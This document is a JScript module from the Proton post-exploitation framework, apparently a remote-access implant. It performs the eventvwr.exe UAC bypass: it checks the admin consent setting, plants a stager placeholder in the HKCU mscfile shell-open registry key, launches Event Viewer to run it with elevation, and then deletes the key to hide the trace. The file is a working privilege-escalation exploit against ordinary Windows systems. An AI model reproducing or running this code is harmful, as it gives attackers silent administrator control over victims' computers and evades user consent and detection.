//            ---------------------------------------------------
//                             Proton Framework              
//            ---------------------------------------------------
//                Copyright (C) <2019-2020>  <Entynetproject>
//
//        This program is free software: you can redistribute it and/or modify
//        it under the terms of the GNU General Public License as published by
//        the Free Software Foundation, either version 3 of the License, or
//        any later version.
//
//        This program is distributed in the hope that it will be useful,
//        but WITHOUT ANY WARRANTY; without even the implied warranty of
//        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
//        GNU General Public License for more details.
//
//        You should have received a copy of the GNU General Public License
//        along with this program.  If not, see <http://www.gnu.org/licenses/>.

try
{
    var consentpath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    var consentval = proton.registry.read(proton.registry.HKLM, consentpath, "ConsentPromptBehaviorAdmin", proton.registry.DWORD).uValue;
    if (consentval == 2)
    {
        var e = Error('Consent value is too high!');
        throw e;
    }
    var path = "Software\\Classes\\mscfile\\shell\\open\\command";

    proton.registry.write(proton.registry.HKCU, path, "", "~STAGER_DATA~", proton.registry.STRING);

    proton.shell.run("eventvwr.exe", true);

    proton.work.report("Completed");

    var now = new Date().getTime();
    while (new Date().getTime() < now + 10000);

    if (proton.registry.destroy(proton.registry.HKCU, path, "") != 0)
    {
        proton.shell.run("reg delete HKCU\\"+path+" /f", true);
    }
}
catch (e)
{
    proton.work.error(e);
}

proton.exit();
